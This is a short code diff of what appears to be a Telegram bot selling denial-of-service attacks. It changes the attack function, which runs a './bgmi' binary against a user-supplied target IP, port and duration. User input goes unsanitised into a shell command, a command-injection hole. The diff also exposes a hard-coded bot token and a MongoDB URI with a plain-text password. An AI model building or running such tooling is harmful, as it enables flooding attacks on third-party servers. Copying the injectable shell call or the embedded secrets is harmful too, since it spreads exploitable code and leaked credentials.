@@ -18,7 +18,7 @@ import psutil
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7350883849:AAGkxJecRtQmEHFs2kFzf6zcDwi2i-PgAVs'
+TOKEN = '7258677107:AAGekf36d_rZd5PzsdaBHwjV8PCi3z2RVRg'
 MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
 FORWARD_CHANNEL_ID = -1002027880444
 CHANNEL_ID = -1002027880444
@@ -153,7 +153,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./IPxKINGYT {target_ip} {target_port} {duration}")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")
     await process.communicate()
     
     bot.attack_in_progress = False
